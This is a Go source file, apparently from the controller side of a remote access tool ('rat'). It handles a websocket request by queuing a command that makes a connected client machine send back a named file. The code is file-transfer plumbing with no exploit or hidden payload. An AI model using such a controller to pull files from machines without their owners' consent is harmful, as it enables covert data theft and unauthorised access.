package main

import (
	"encoding/json"
	"io/ioutil"
	"rat/common"

	"golang.org/x/net/websocket"
)

type DownloadEvent struct {
	File string `json:"file"`
}

type DownloadMessage Message

func (d DownloadMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
	var downloadEvent DownloadEvent
	err := json.Unmarshal([]byte(data), &downloadEvent)

	if err != nil {
		return err
	}

	file, err := ioutil.TempFile("", "download")
	if err != nil {
		return err
	}

	client.Listeners[common.GetFileHeader] = ws
	Transfers[downloadEvent.File] = &Transfer{file, downloadEvent.File, 0, 0}
	client.Queue <- &DownloadPacket{File: downloadEvent.File}

	return nil
}
